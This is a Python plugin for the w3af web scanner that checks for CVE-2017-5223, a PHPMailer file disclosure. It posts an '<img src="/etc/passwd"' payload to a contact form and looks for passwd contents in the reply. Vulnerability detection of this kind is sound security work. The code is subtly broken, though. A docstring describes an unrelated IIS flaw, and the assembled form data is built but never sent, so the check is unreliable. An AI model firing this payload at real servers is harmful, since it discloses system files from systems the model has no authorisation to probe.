from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.controllers.misc.decorators import runonce
from w3af.core.controllers.exceptions import RunOnce
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest

import re


class cve_2017_5223(InfrastructurePlugin):
	"""
	Detect CVE-2017-5223 (PHPMailer < 5.2.21 - Local File Disclosure)
	"""
	NAME = "CVE 2017-5223"

	@runonce(exc_class=RunOnce)
	def discover(self, fuzzable_http_request):
		"""
		Checks if the remote IIS is vulnerable to MS15-034
		"""
		url = fuzzable_http_request.get_url()
		url = url.url_join("/contact.php")
		
		email = 'test@cystack.net'
		payload = '<img src="/etc/passwd"'
		name = 'CystackVulnScanner'
		post_data = "action=send&your-name={name}&your-email={email}&cc=yes&your-message={payload}".format(name=name, email=email, payload=payload)
		response = self.requestor.http.POST(url, data=payload, cache=False, grep=False)
		match =  re.search("root:x:", response.get_body())
		vuln_data = {
			"file": "/etc/passwd",
		}

		if match:
			fr = FuzzableHTTPRequest.from_http_response(response)
			vuln = self.create_vuln("CVE-2017-5223 (PHPMailer < 5.2.21 - Local File Disclosure)", traffic_ids=response.id, mutant=fr, data=vuln_data)
			self.save_vuln(vuln, vuln_type="php_mailer")
